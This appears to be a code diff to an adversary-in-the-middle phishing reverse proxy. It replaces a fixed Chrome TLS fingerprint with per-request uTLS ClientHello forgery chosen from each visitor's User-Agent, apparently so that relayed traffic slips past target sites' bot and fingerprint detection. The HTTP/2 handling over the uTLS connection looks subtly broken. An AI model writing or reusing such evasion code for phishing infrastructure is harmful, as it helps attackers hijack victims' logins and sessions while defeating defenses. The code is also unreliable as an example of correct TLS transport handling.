@@ -147,38 +147,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
-	// --- START uTLS FINGERPRINT MIMICRY ---
-	// Override the proxy transport to use uTLS for outbound connections
-	if p.Proxy.Tr != nil {
-		p.Proxy.Tr.DialTLS = func(network, addr string) (net.Conn, error) {
-			dialer := net.Dialer{Timeout: 30 * time.Second}
-			tcpConn, err := dialer.Dial(network, addr)
-			if err != nil {
-				return nil, err
-			}
-
-			// Extract hostname for SNI
-			host, _, _ := net.SplitHostPort(addr)
-			
-			// Configure uTLS to mimic a specific browser (e.g., Chrome)
-			uConfig := &utls.Config{
-				ServerName: host,
-				// InsecureSkipVerify: true, // Uncomment if testing against self-signed certs
-			}
-			
-			// HelloChrome_Auto randomizes the fingerprint slightly to look like a modern Chrome version
-			uConn := utls.UClient(tcpConn, uConfig, utls.HelloChrome_Auto)
-			
-			if err := uConn.Handshake(); err != nil {
-				_ = tcpConn.Close()
-				return nil, err
-			}
-			
-			return uConn, nil
-		}
-	}
-	// --- END uTLS FINGERPRINT MIMICRY ---
-
+	
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
@@ -276,6 +245,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 			}
+
+			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING ---
+			// 1. Get User-Agent
+			userAgent := req.Header.Get("User-Agent")
+
+			// 2. Create custom transport mimicking the specific browser
+			customTransport := newTransportWithUA(userAgent)
+
+			// 3. Assign transport to context (Overrides global settings)
+			ctx.RoundTripper = customTransport
+			// --- END: DYNAMIC TLS & HTTP/2 SWITCHING ---
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
@@ -2088,4 +2068,65 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+			   // --- HELPER FUNCTIONS FOR DYNAMIC TLS ---
+
+func getClientHelloID(userAgent string) utls.ClientHelloID {
+	ua := strings.ToLower(userAgent)
+
+	// 1. Android
+	if strings.Contains(ua, "android") {
+		return utls.HelloAndroid_11_OkHttp
+	}
+
+	// 2. iOS / Safari (iPhone, iPad, Mac)
+	if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") || (strings.Contains(ua, "macintosh") && strings.Contains(ua, "safari") && !strings.Contains(ua, "chrome")) {
+		return utls.HelloIOS_Auto
+	}
+
+	// 3. Firefox
+	if strings.Contains(ua, "firefox") {
+		return utls.HelloFirefox_Auto
+	}
+
+	// 4. Edge
+	if strings.Contains(ua, "edg/") {
+		return utls.HelloChrome_Auto
+	}
+
+	// 5. Chrome (Default fallback)
+	return utls.HelloChrome_Auto
+}
+
+func newTransportWithUA(ua string) *http.Transport {
+	return &http.Transport{
+		ForceAttemptHTTP2: true, // Enable HTTP/2
+		DialTLS: func(network, addr string) (net.Conn, error) {
+			dialer := net.Dialer{
+				Timeout:   30 * time.Second,
+				KeepAlive: 30 * time.Second,
+			}
+
+			tcpConn, err := dialer.Dial(network, addr)
+			if err != nil {
+				return nil, err
+			}
+
+			// Get the matching fingerprint for the user
+			helloID := getClientHelloID(ua)
+
+			uConfig := &utls.Config{
+				ServerName: strings.Split(addr, ":")[0],
+				NextProtos: []string{"h2", "http/1.1"}, // Advertise HTTP/2
+			}
+
+			uConn := utls.UClient(tcpConn, uConfig, helloID)
+			if err := uConn.Handshake(); err != nil {
+				_ = tcpConn.Close()
+				return nil, err
+			}
+
+			return uConn, nil
+		},
+	}
 }
